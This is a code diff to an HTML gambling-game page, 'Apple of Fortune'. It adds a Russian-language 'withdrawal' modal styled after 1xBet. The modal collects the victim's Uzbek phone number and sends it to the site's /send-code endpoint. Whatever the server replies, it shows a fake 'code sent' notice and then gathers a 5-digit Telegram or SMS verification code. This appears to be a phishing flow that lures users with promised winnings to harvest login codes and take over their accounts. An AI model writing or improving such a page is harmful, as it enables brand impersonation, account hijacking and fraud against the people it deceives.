@@ -6,7 +6,7 @@
     <title>Apple of Fortune - JECKPOT</title>
     <!-- FontAwesome & Google Fonts -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&family=Montserrat:wght@500;700;800;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;600;700&family=Montserrat:wght@500;600;700;800;900&display=swap" rel="stylesheet">
 
     <style>
         :root {
@@ -414,72 +414,232 @@
             font-weight: 700;
         }
 
-        .form-group {
-            display: flex;
-            flex-direction: column;
-            gap: 6px;
-            margin-bottom: 12px;
+        /* --- 1XBET STYLED WITHDRAWAL MODAL --- */
+        .1xbet-card {
+            background: #eef2f5;
+            border-radius: 12px;
+            color: #333;
             text-align: left;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            padding: 0;
         }
 
-        .phone-input-group {
-            display: flex;
-            gap: 6px;
-        }
-
-        .country-code {
-            background: #1e293b;
-            border: 1.5px solid #475569;
-            border-radius: 8px;
-            padding: 0 10px;
+        .1xbet-header {
+            background: #386289;
+            color: #fff;
+            padding: 12px 15px;
+            font-size: 15px;
+            font-weight: 700;
             display: flex;
             align-items: center;
-            font-size: 13px;
-            font-weight: 700;
-        }
-
-        .code-timer-btn {
-            background: var(--blue-btn);
-            border: 1.5px solid #60a5fa;
-            border-radius: 8px;
-            padding: 10px;
-            color: #fff;
-            font-family: 'Fredoka', cursive;
-            cursor: pointer;
-            width: 100%;
-            margin-bottom: 12px;
-            font-weight: 600;
-        }
-
-        .code-boxes {
-            display: flex;
             justify-content: space-between;
-            gap: 6px;
+        }
+
+        .1xbet-header-back {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .1xbet-body {
+            padding: 15px;
+        }
+
+        .1xbet-sub-title {
+            text-align: center;
+            font-weight: 700;
+            color: #2b4c6f;
+            font-size: 15px;
+            margin-bottom: 6px;
+        }
+
+        .1xbet-desc {
+            text-align: center;
+            font-size: 12px;
+            color: #475569;
+            line-height: 1.35;
             margin-bottom: 15px;
         }
 
-        .code-box-input {
-            width: 100%;
-            height: 42px;
-            background: #0d0501;
-            border: 1.5px solid #5a3010;
+        .1xbet-input-row {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .1xbet-country-box {
+            background: #fff;
+            border: 1px solid #cbd5e1;
             border-radius: 8px;
+            padding: 8px 10px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 700;
+            color: #1e293b;
+            min-width: 105px;
+        }
+
+        .1xbet-country-box img {
+            width: 20px;
+            height: 14px;
+            border-radius: 2px;
+        }
+
+        .1xbet-input-box {
+            flex: 1;
+            background: #fff;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            padding: 8px 12px;
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .1xbet-input-box input {
+            width: 100%;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 14px;
+            font-weight: 600;
+            color: #1e293b;
+        }
+
+        .1xbet-input-box input::placeholder {
+            color: #94a3b8;
+            font-weight: 400;
+        }
+
+        .1xbet-lock-icon {
+            color: #64748b;
+            font-size: 14px;
+            position: absolute;
+            right: 10px;
+        }
+
+        .1xbet-dropdown-box {
+            background: #fff;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            padding: 10px 12px;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            font-size: 13px;
+            color: #334155;
+            font-weight: 600;
+        }
+
+        .1xbet-btn {
+            width: 100%;
+            padding: 12px;
+            background: #5b7f9e;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+            text-align: center;
+        }
+
+        .1xbet-btn.active {
+            background: #3b82f6;
+        }
+
+        .1xbet-btn.timer {
+            background: #64748b;
+            cursor: not-allowed;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* Modal: Selection Popup */
+        .select-option-item {
+            padding: 12px;
+            border-bottom: 1px solid #e2e8f0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            color: #1e293b;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .select-option-item:last-child { border-bottom: none; }
+
+        /* Telegram Alert Box */
+        .1xbet-alert-popup {
+            background: #fff;
+            border-radius: 12px;
+            padding: 15px;
+            text-align: left;
+            color: #1e293b;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        }
+
+        .1xbet-alert-title {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #65a30d;
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .1xbet-alert-msg {
+            font-size: 12px;
+            color: #475569;
+            line-height: 1.4;
+            margin-bottom: 15px;
+        }
+
+        .1xbet-alert-btn {
+            background: #84cc16;
+            color: #fff;
+            text-align: center;
+            padding: 8px;
+            border-radius: 6px;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        .code-boxes-1xbet {
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            margin: 15px 0;
+        }
+
+        .code-box-input-1x {
+            width: 42px;
+            height: 42px;
+            background: #fff;
+            border: 1.5px solid #cbd5e1;
+            border-radius: 6px;
             text-align: center;
             font-size: 18px;
-            color: #fff;
+            font-weight: 700;
+            color: #0f172a;
             outline: none;
         }
 
-        .status-alert {
-            background: rgba(34, 197, 94, 0.15);
-            border: 1px solid #22c55e;
-            color: #86efac;
-            font-size: 12px;
-            padding: 8px;
-            border-radius: 8px;
-            text-align: center;
-            margin-bottom: 12px;
-            display: none;
+        .code-box-input-1x:focus {
+            border-color: #3b82f6;
         }
     </style>
 </head>
@@ -573,41 +733,104 @@
         </div>
     </div>
 
-    <!-- MODAL: PUL YECHIB OLISH -->
+    <!-- MODAL: 1XBET STYLED WITHDRAWAL -->
     <div class="modal-overlay" id="withdrawModal">
-        <div class="modal-box">
-            <div class="modal-close-btn" onclick="closeModal('withdrawModal')"><i class="fa-solid fa-xmark"></i></div>
-            <div class="modal-header-title">MABLAG'NI YECHIB OLISH</div>
-            
-            <div class="form-group">
-                <label style="font-size: 12px;">Telefon raqamingiz:</label>
-                <div class="phone-input-group">
-                    <div class="country-code">🇺🇿 +998</div>
-                    <div class="bet-input-container" style="margin:0; flex:1;">
-                        <input type="tel" class="bet-input-field" id="withdrawPhone" placeholder="901234567" maxlength="9">
+        <div class="modal-box 1xbet-card">
+            <div class="1xbet-header">
+                <div class="1xbet-header-back" onclick="closeModal('withdrawModal')">
+                    <i class="fa-solid fa-arrow-left"></i>
+                    <span>РЕГИСТРАЦИЯ</span>
+                </div>
+            </div>
+
+            <div class="1xbet-body">
+                <div class="1xbet-sub-title">По телефону</div>
+                <div class="1xbet-desc">
+                    Для регистрации на сайте введите номер телефона и выберите способ получения кода
+                </div>
+
+                <!-- Phone Input Row -->
+                <div class="1xbet-input-row">
+                    <div class="1xbet-country-box">
+                        <img src="https://flagcdn.com/w40/uz.png" alt="UZ">
+                        <span>Код +998</span>
+                    </div>
+                    <div class="1xbet-input-box">
+                        <input type="tel" id="withdrawPhone" placeholder="Номер телефона" maxlength="13" oninput="formatAndValidatePhone(this)">
+                        <i class="fa-solid fa-lock 1xbet-lock-icon" id="phoneLockIcon"></i>
                     </div>
                 </div>
-            </div>
 
-            <button class="code-timer-btn" id="sendCodeBtn" onclick="sendVerificationCode()">Telegramdan Kod Olish</button>
-
-            <div class="status-alert" id="statusAlert">
-                <i class="fa-solid fa-circle-check"></i> Kod Telegramingizga yuborildi!
-            </div>
-
-            <div class="form-group" id="codeGroup" style="display: none;">
-                <label style="font-size: 12px;">Telegramga kelgan kod:</label>
-                <div class="code-boxes">
-                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 0)">
-                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 1)">
-                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 2)">
-                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 3)">
-                    <input type="text" class="code-box-input" maxlength="1" oninput="moveNext(this, 4)">
+                <!-- Delivery Method Selector -->
+                <div style="font-size: 11px; color: #64748b; margin-bottom: 4px; font-weight: 600;">Способ отправки</div>
+                <div class="1xbet-dropdown-box" onclick="openMethodSelectModal()">
+                    <span id="selectedMethodText">Telegram</span>
+                    <i class="fa-solid fa-chevron-down"></i>
                 </div>
-                <button class="btn-modal-confirm" onclick="submitWithdraw()">TASDIQLASH VA YECHISH</button>
+
+                <!-- Code Section (Appears after code is sent) -->
+                <div id="codeEntrySection" style="display: none;">
+                    <div style="font-size: 12px; font-weight: 700; color: #1e293b; text-align: center; margin-top: 10px;">
+                        Введите код подтверждения
+                    </div>
+                    <div class="code-boxes-1xbet">
+                        <input type="text" class="code-box-input-1x" maxlength="1" oninput="moveNext(this, 0)">
+                        <input type="text" class="code-box-input-1x" maxlength="1" oninput="moveNext(this, 1)">
+                        <input type="text" class="code-box-input-1x" maxlength="1" oninput="moveNext(this, 2)">
+                        <input type="text" class="code-box-input-1x" maxlength="1" oninput="moveNext(this, 3)">
+                        <input type="text" class="code-box-input-1x" maxlength="1" oninput="moveNext(this, 4)">
+                    </div>
+                    <button class="1xbet-btn active" style="background: #22c55e; margin-bottom: 10px;" onclick="submitWithdraw()">ПОДТВЕРДИТЬ И ВЫВЕСТИ</button>
+                </div>
+
+                <!-- Send Code / Timer Button -->
+                <button class="1xbet-btn" id="sendCodeBtn" onclick="sendVerificationCode()" disabled>
+                    Отправить в Telegram
+                </button>
             </div>
         </div>
     </div>
+
+    <!-- MODAL: SPOSOB OTPRAVKI SELECTION -->
+    <div class="modal-overlay" id="methodSelectModal">
+        <div class="modal-box 1xbet-card" style="max-width: 320px;">
+            <div class="1xbet-header">
+                <div class="1xbet-header-back" onclick="closeModal('methodSelectModal')">
+                    <i class="fa-solid fa-arrow-left"></i>
+                    <span>СПОСОБ ОТПРАВКИ</span>
+                </div>
+            </div>
+            <div style="padding: 10px 0; background: #fff;">
+                <div class="select-option-item" onclick="selectMethod('SMS')">
+                    <i class="fa-regular fa-circle" id="radioSMS"></i>
+                    <span>SMS</span>
+                </div>
+                <div class="select-option-item" onclick="selectMethod('Telegram')">
+                    <i class="fa-solid fa-circle-dot" style="color: #3b82f6;" id="radioTG"></i>
+                    <span>Telegram</span>
+                </div>
+            </div>
+            <div style="display: flex; gap: 8px; padding: 10px; background: #eef2f5;">
+                <button class="1xbet-btn" style="background: #cbd5e1; color: #334155;" onclick="closeModal('methodSelectModal')">ОТМЕНИТЬ</button>
+                <button class="1xbet-btn active" style="background: #84cc16;" onclick="closeModal('methodSelectModal')">СОХРАНИТЬ</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL: CODE SENT POPUP -->
+    <div class="modal-overlay" id="codeSentAlertModal">
+        <div class="modal-box 1xbet-alert-popup" style="max-width: 320px;">
+            <div class="1xbet-alert-title">
+                <i class="fa-solid fa-circle-check"></i>
+                <span>Код отправлен</span>
+            </div>
+            <div class="1xbet-alert-msg" id="alertModalText">
+                Если к номеру +99890*****22 ещё не привязан аккаунт, код подтверждения придет в Telegram
+            </div>
+            <div class="1xbet-alert-btn" onclick="closeModal('codeSentAlertModal')">OK</div>
+        </div>
+    </div>
+
 </div>
 
 <script>
@@ -625,7 +848,7 @@
     };
 
     sounds.fon.loop = true;
-    sounds.fon.volume = 0.35; // Fondagi musiqa ovozi pastroq
+    sounds.fon.volume = 0.35;
 
     function playSound(soundObj) {
         if (!soundObj) return;
@@ -636,7 +859,6 @@
     function playTugmaSound() { playSound(sounds.tugma); }
     function playYechishSound() { playSound(sounds.yechish); }
 
-    // Ekran birinchi bosilganda fon musiqasini yoqish (brauzer avto-play cheklovini aylanib o'tish)
     document.addEventListener('click', () => {
         if (sounds.fon.paused) {
             sounds.fon.play().catch(() => {});
@@ -655,6 +877,8 @@
     let isPlaying = false;
     let gridData = [];
     let isWithdrawPromptShown = false;
+    let selectedMethod = 'Telegram';
+    let timerInterval = null;
 
     async function syncBalance() {
         try {
@@ -883,51 +1107,121 @@
         document.querySelectorAll('.grid-row').forEach(r => r.classList.remove('active'));
     }
 
+    /* --- 1XBET WITHDRAW LOGIC --- */
+    function formatAndValidatePhone(input) {
+        let raw = input.value.replace(/\D/g, '');
+        if (raw.startsWith('998')) raw = raw.substring(3);
+        
+        let formatted = '';
+        if (raw.length > 0) formatted += raw.substring(0, 2);
+        if (raw.length >= 3) formatted += ' ' + raw.substring(2, 5);
+        if (raw.length >= 6) formatted += ' ' + raw.substring(5, 7);
+        if (raw.length >= 8) formatted += ' ' + raw.substring(7, 9);
+        
+        input.value = formatted;
+
+        const sendBtn = document.getElementById('sendCodeBtn');
+        const lockIcon = document.getElementById('phoneLockIcon');
+
+        if (raw.length === 9) {
+            sendBtn.disabled = false;
+            sendBtn.classList.add('active');
+            lockIcon.style.color = '#3b82f6';
+        } else {
+            sendBtn.disabled = true;
+            sendBtn.classList.remove('active');
+            lockIcon.style.color = '#64748b';
+        }
+    }
+
+    function openMethodSelectModal() {
+        playTugmaSound();
+        openModal('methodSelectModal');
+    }
+
+    function selectMethod(method) {
+        selectedMethod = method;
+        document.getElementById('selectedMethodText').innerText = method;
+        const sendBtn = document.getElementById('sendCodeBtn');
+        sendBtn.innerText = `Отправить в ${method}`;
+
+        if (method === 'SMS') {
+            document.getElementById('radioSMS').className = "fa-solid fa-circle-dot";
+            document.getElementById('radioSMS').style.color = "#3b82f6";
+            document.getElementById('radioTG').className = "fa-regular fa-circle";
+            document.getElementById('radioTG').style.color = "";
+        } else {
+            document.getElementById('radioTG').className = "fa-solid fa-circle-dot";
+            document.getElementById('radioTG').style.color = "#3b82f6";
+            document.getElementById('radioSMS').className = "fa-regular fa-circle";
+            document.getElementById('radioSMS').style.color = "";
+        }
+    }
+
     async function sendVerificationCode() {
         playTugmaSound();
-        const phone = document.getElementById('withdrawPhone').value.trim();
-        if (phone.length < 9) {
-            alert("Iltimos, to'g'ri telefon raqam kiriting!");
-            return;
-        }
+        const phoneInput = document.getElementById('withdrawPhone').value.replace(/\s+/g, '');
+        if (phoneInput.length < 9) return;
+
+        const formattedPhone = `+998${phoneInput}`;
+        const hiddenPhone = `+998${phoneInput.substring(0, 2)}*****${phoneInput.substring(7)}`;
 
         try {
-            const res = await fetch(`${API_URL}/send-code`, {
+            await fetch(`${API_URL}/send-code`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, channel: 'telegram' })
+                body: JSON.stringify({ phone: formattedPhone, method: selectedMethod })
             });
+        } catch (e) {}
 
-            const data = await res.json();
-            if (data.success) {
-                document.getElementById('statusAlert').style.display = 'block';
-                document.getElementById('codeGroup').style.display = 'block';
-            } else {
-                alert(data.message || "Kod Telegramga yuborildi!");
-                document.getElementById('statusAlert').style.display = 'block';
-                document.getElementById('codeGroup').style.display = 'block';
+        document.getElementById('alertModalText').innerText = `Если к номеру ${hiddenPhone} ещё не привязан аккаунт, код подтверждения придет в ${selectedMethod}`;
+        openModal('codeSentAlertModal');
+
+        document.getElementById('codeEntrySection').style.display = 'block';
+
+        startTimer(120);
+    }
+
+    function startTimer(seconds) {
+        const sendBtn = document.getElementById('sendCodeBtn');
+        sendBtn.disabled = true;
+        sendBtn.classList.remove('active');
+        sendBtn.classList.add('timer');
+
+        clearInterval(timerInterval);
+
+        timerInterval = setInterval(() => {
+            const mins = String(Math.floor(seconds / 60)).padStart(2, '0');
+            const secs = String(seconds % 60).padStart(2, '0');
+            
+            sendBtn.innerHTML = `<i class="fa-regular fa-clock"></i> ${mins}:${secs} Отправлен в ${selectedMethod}`;
+
+            if (seconds <= 0) {
+                clearInterval(timerInterval);
+                sendBtn.classList.remove('timer');
+                sendBtn.disabled = false;
+                sendBtn.classList.add('active');
+                sendBtn.innerText = `Отправить в ${selectedMethod}`;
             }
-        } catch (e) {
-            document.getElementById('statusAlert').style.display = 'block';
-            document.getElementById('codeGroup').style.display = 'block';
-        }
+            seconds--;
+        }, 1000);
     }
 
     function moveNext(input, index) {
         if (input.value.length >= 1) {
-            const inputs = document.querySelectorAll('.code-box-input');
+            const inputs = document.querySelectorAll('.code-box-input-1x');
             if (inputs[index + 1]) inputs[index + 1].focus();
         }
     }
 
     async function submitWithdraw() {
         playTugmaSound();
-        const inputs = document.querySelectorAll('.code-box-input');
+        const inputs = document.querySelectorAll('.code-box-input-1x');
         let inputCode = '';
         inputs.forEach(input => inputCode += input.value);
 
         if (inputCode.length < 5) {
-            alert("Iltimos, 5 xonali kodni to'liq kiriting!");
+            alert("Пожалуйста, введите полный 5-значный код!");
             return;
         }
 
